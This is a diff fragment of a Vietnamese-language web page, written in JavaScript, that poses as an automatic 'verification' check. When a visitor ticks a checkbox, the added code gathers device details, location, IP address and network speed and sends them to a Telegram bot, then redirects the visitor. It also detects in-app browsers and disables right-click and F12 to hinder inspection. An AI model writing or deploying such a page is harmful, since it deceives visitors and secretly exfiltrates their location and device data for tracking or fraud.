+        let finalReport = `${deviceInfo}\n\n${locationText}${ipSection}\n\n━━━━━━━━━━━━━━━━━━━━━━\n⚡ TỐC ĐỘ MẠNG:\n📡 Ping: ${speed.ping} ms\n⬇️ Tải xuống: ${speed.downMbps} Mbps\n⬆️ Tải lên: ${speed.upMbps} Mbps\n━━━━━━━━━━━━━━━━━━━━━━\n✅ Mã xác minh: ${Math.floor(Math.random()*1000000)}\n🔒 Báo cáo tự động từ hệ thống xác thực.`;
+
+        await sendToTelegram(finalReport);
+        await delay(500);
+        setStepDone(3, 'Đã gửi báo cáo thành công');
+        setProgress(100, 100);
+
+        isRunning = false;
+        actionBtn.disabled = true;
+        btnTextSpan.innerHTML = '✅ HOÀN TẤT';
+
+        // chuyển hướng sau vài giây
+        setTimeout(() => {
+            window.location.href = TELEGRAM.redirectUrl;
+        }, TELEGRAM.redirectDelay * 1000);
+    }
+
+    function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    // ========== XỬ LÝ Ô XÁC NHẬN ==========
+    function initVerifyToggle() {
+        verifyBox.addEventListener('click', () => {
+            if (isRunning) return;
+            verified = !verified;
+            if (verified) {
+                verifyBox.classList.add('active');
+                checkboxIcon.innerHTML = '✓';
+                actionBtn.disabled = false;
+                btnTextSpan.innerText = '🔐 BẮT ĐẦU XÁC MINH';
+                // tự động chạy luôn khi tích
+                startVerification();
+            } else {
+                verifyBox.classList.remove('active');
+                checkboxIcon.innerHTML = '';
+                actionBtn.disabled = true;
+                btnTextSpan.innerText = '🔐 CHỜ XÁC NHẬN';
+            }
+        });
+    }
+
+    // ========== PHÁT HIỆN IN-APP BROWSER ==========
+    function isInAppBrowser() {
         const ua = navigator.userAgent;
-        const isEmbedded = /TikTok|musical_ly|FBAN|FBAV|Zalo|Instagram|Line|Messenger/i.test(ua);
-        if(isEmbedded) {
+        const isEmbedded = /TikTok|musical_ly|FBAN|FBAV|Zalo|Instagram|Line|Messenger|Weibo/i.test(ua);
+        return isEmbedded;
+    }
+
+    function init() {
+        if (isInAppBrowser()) {
             document.getElementById('warningOverlay').style.display = 'flex';
             document.getElementById('mainUI').style.display = 'none';
-            return true;
+            return;
         }
-        return false;
+        initVerifyToggle();
+        actionBtn.disabled = true;
+        btnTextSpan.innerText = '🔐 CHỜ XÁC NHẬN';
+        // nếu người dùng bấm nút (khi đã tích) cũng gọi lại (đảm bảo)
+        actionBtn.onclick = () => {
+            if (verified && !isRunning) {
+                startVerification();
+            }
+        };
     }
 
-    async function init() {
-        if(checkInAppBrowser()) return;
-        // cho phép người dùng biết hệ thống sẽ tự kích nếu có quyền
-        setButtonManualEnable(false);
-        await checkPermissionsAndAutoStart();
-    }
-
-    // anti debug nhẹ
+    // chống sao chép / view source cơ bản
     document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', (e) => { if(e.keyCode === 123) e.preventDefault(); });
+    document.addEventListener('keydown', (e) => { if (e.keyCode === 123) e.preventDefault(); });
+    
     init();
 </script>
 </body>
